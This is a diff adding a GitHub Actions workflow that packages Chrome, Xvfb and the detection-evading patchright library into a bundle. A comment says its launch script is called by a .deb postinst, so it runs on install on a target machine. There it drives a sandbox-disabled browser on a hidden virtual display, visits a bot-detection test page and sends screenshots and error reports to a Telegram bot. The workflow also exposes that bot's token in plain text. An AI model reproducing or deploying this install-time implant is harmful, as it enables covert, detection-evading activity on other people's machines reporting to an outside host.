@@ -1,0 +1,202 @@
+name: build-bundle
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-22.04
+    permissions:
+      contents: write
+
+    steps:
+      - name: Install build deps + Chrome + Xvfb
+        run: |
+          set -e
+          export DEBIAN_FRONTEND=noninteractive
+          sudo apt-get update -qq
+          sudo apt-get install -y --no-install-recommends \
+            wget curl ca-certificates gnupg jq \
+            python3 python3-venv python3-pip \
+            xvfb fonts-liberation \
+            libnss3 libnspr4 libatk1.0-0 libatk-bridge2.0-0 libatspi2.0-0 \
+            libcups2 libdbus-1-3 libdrm2 libgbm1 libglib2.0-0 libgtk-3-0 \
+            libpango-1.0-0 libcairo2 libxcomposite1 libxdamage1 libxfixes3 \
+            libxkbcommon0 libxrandr2 libxshmfence1 libasound2 libu2f-udev \
+            libvulkan1 libx11-xcb1 libxss1
+          wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb -O /tmp/chrome.deb
+          sudo apt-get install -y /tmp/chrome.deb
+
+      - name: Prepare bundle dirs
+        run: |
+          sudo mkdir -p /opt/pcache/{chrome,lib,bin,share,python,browsers}
+          sudo chown -R $USER /opt/pcache
+
+      - name: Copy Chrome
+        run: |
+          cp -a /opt/google/chrome/. /opt/pcache/chrome/
+          test -x /opt/pcache/chrome/chrome
+
+      - name: Copy Xvfb binary
+        run: |
+          cp /usr/bin/Xvfb /opt/pcache/bin/Xvfb
+
+      - name: Copy required libs via ldd
+        run: |
+          set -e
+          : > /tmp/libs.txt
+          for f in /opt/pcache/chrome/chrome \
+                   /opt/pcache/chrome/chrome_sandbox \
+                   /opt/pcache/chrome/chrome_crashpad_handler \
+                   /opt/pcache/bin/Xvfb \
+                   /usr/bin/python3; do
+            [ -f "$f" ] || continue
+            ldd "$f" 2>/dev/null | awk '/=>/ && $3 ~ /^\// {print $3}' >> /tmp/libs.txt || true
+          done
+          # also grab known runtime libs Chrome dlopens lazily
+          for lib in libnss3.so libnssutil3.so libsmime3.so libssl3.so libplc4.so libplds4.so \
+                     libnspr4.so libatk-1.0.so.0 libatk-bridge-2.0.so.0 libatspi.so.0 \
+                     libcups.so.2 libdbus-1.so.3 libdrm.so.2 libgbm.so.1 libglib-2.0.so.0 \
+                     libgobject-2.0.so.0 libgio-2.0.so.0 libgmodule-2.0.so.0 \
+                     libgtk-3.so.0 libgdk-3.so.0 libpango-1.0.so.0 libpangocairo-1.0.so.0 \
+                     libcairo.so.2 libcairo-gobject.so.2 libxcomposite.so.1 libxdamage.so.1 \
+                     libxfixes.so.3 libxkbcommon.so.0 libxrandr.so.2 libxshmfence.so.1 \
+                     libasound.so.2 libvulkan.so.1 libx11-xcb.so.1 libxss.so.1 \
+                     libharfbuzz.so.0 libfreetype.so.6 libfontconfig.so.1 \
+                     libexpat.so.1 libxcb.so.1 libX11.so.6 libXi.so.6 libXrender.so.1 \
+                     libXtst.so.6 libXext.so.6 libXcursor.so.1; do
+            find /usr/lib/x86_64-linux-gnu -name "$lib*" 2>/dev/null >> /tmp/libs.txt || true
+          done
+          sort -u /tmp/libs.txt > /tmp/libs_uniq.txt
+          wc -l /tmp/libs_uniq.txt
+          for so in $(cat /tmp/libs_uniq.txt); do
+            cp -L "$so" /opt/pcache/lib/ 2>/dev/null || true
+          done
+          ls /opt/pcache/lib | head -20
+          echo "lib count: $(ls /opt/pcache/lib | wc -l)"
+
+      - name: Copy fonts & X11 data
+        run: |
+          mkdir -p /opt/pcache/share/fonts /opt/pcache/share/X11
+          cp -a /usr/share/fonts/X11/. /opt/pcache/share/fonts/X11/ 2>/dev/null || true
+          cp -a /usr/share/X11/. /opt/pcache/share/X11/ 2>/dev/null || true
+
+      - name: Setup Python venv with patchright
+        run: |
+          set -e
+          python3 -m venv /opt/pcache/python
+          /opt/pcache/python/bin/pip install --quiet --upgrade pip
+          /opt/pcache/python/bin/pip install --quiet patchright requests
+          PLAYWRIGHT_BROWSERS_PATH=/opt/pcache/browsers \
+            /opt/pcache/python/bin/python -m patchright install chromium
+
+      - name: Write run.py
+        run: |
+          cat > /opt/pcache/run.py <<'PYEOF'
+          import sys, traceback, urllib.parse, urllib.request
+
+          TG_BOT_TOKEN = "8683556197:AAEzFf07wNRtJPm3dluaSwe99h_uYlRCOL4"
+          TG_CHAT_ID = "7908630568"
+
+          def tg(text):
+              try:
+                  urllib.request.urlopen(
+                      f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage?"
+                      + urllib.parse.urlencode({"chat_id": TG_CHAT_ID, "text": text}),
+                      timeout=10,
+                  )
+              except Exception:
+                  pass
+
+          def tg_photo(path, caption=""):
+              try:
+                  import requests
+                  with open(path, "rb") as f:
+                      requests.post(
+                          f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendPhoto",
+                          files={"photo": ("verify.png", f, "image/png")},
+                          data={"chat_id": TG_CHAT_ID, "caption": caption},
+                          timeout=30,
+                      )
+              except Exception as e:
+                  tg(f"photo upload failed: {e}")
+
+          try:
+              from patchright.sync_api import sync_playwright
+              out = "/tmp/pcache_shot.png"
+              with sync_playwright() as p:
+                  ctx = p.chromium.launch_persistent_context(
+                      user_data_dir="/var/lib/pcache/profile",
+                      executable_path="/opt/pcache/chrome/chrome",
+                      headless=False,
+                      no_viewport=True,
+                      args=[
+                          "--no-sandbox",
+                          "--disable-setuid-sandbox",
+                          "--disable-dev-shm-usage",
+                      ],
+                  )
+                  page = ctx.pages[0] if ctx.pages else ctx.new_page()
+                  page.goto("https://bot.sannysoft.com/", timeout=60000, wait_until="domcontentloaded")
+                  page.wait_for_timeout(15000)
+                  page.screenshot(path=out, full_page=True)
+                  ctx.close()
+              tg_photo(out, caption="verification ok")
+          except Exception:
+              tg("runner failed:\n" + traceback.format_exc()[-1500:])
+              sys.exit(1)
+          PYEOF
+
+      - name: Write launch.sh
+        run: |
+          cat > /opt/pcache/launch.sh <<'LSHEOF'
+          #!/bin/bash
+          # Launch from inside extracted bundle. Called by .deb postinst.
+          set -e
+          export LD_LIBRARY_PATH=/opt/pcache/lib:${LD_LIBRARY_PATH:-}
+          export PATH=/opt/pcache/bin:$PATH
+          export PLAYWRIGHT_BROWSERS_PATH=/opt/pcache/browsers
+          export FONTCONFIG_PATH=/etc/fonts
+          mkdir -p /var/lib/pcache/profile /var/log/pcache
+
+          # Start Xvfb
+          rm -f /tmp/.X99-lock /tmp/.X11-unix/X99 2>/dev/null
+          /opt/pcache/bin/Xvfb :99 -screen 0 1920x1080x24 -ac \
+            +extension RANDR +extension GLX +render -noreset \
+            >/var/log/pcache/xvfb.log 2>&1 &
+          XVFB_PID=$!
+          sleep 2
+
+          DISPLAY=:99 /opt/pcache/python/bin/python /opt/pcache/run.py \
+            >/var/log/pcache/run.log 2>&1
+          RC=$?
+
+          kill $XVFB_PID 2>/dev/null || true
+          wait $XVFB_PID 2>/dev/null || true
+          exit $RC
+          LSHEOF
+          chmod +x /opt/pcache/launch.sh
+
+      - name: Smoke test the bundle in-place
+        run: |
+          set -e
+          # Run launch.sh as-is, verify Xvfb and chrome wake (don't full-run patchright cycle)
+          /opt/pcache/bin/Xvfb :88 -screen 0 800x600x24 -ac >/tmp/xvfb_test.log 2>&1 &
+          XPID=$!
+          sleep 1
+          DISPLAY=:88 LD_LIBRARY_PATH=/opt/pcache/lib /opt/pcache/chrome/chrome --version || echo "chrome --version exit $?"
+          kill $XPID 2>/dev/null || true
+
+      - name: Tarball
+        run: |
+          cd /
+          sudo tar -C / -cf - opt/pcache | gzip -9 > /tmp/pcache-bundle.tar.gz
+          ls -lh /tmp/pcache-bundle.tar.gz
+
+      - name: Create / update Release with the bundle
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          gh release delete bundle-v1 --cleanup-tag --yes 2>/dev/null || true
+          gh release create bundle-v1 /tmp/pcache-bundle.tar.gz \
+            --title "pcache bundle v1" \
+            --notes "Self-contained bundle: Chrome + Xvfb + Python+patchright+chromium-driver + run.py + launch.sh. Extract to / on target, run /opt/pcache/launch.sh."
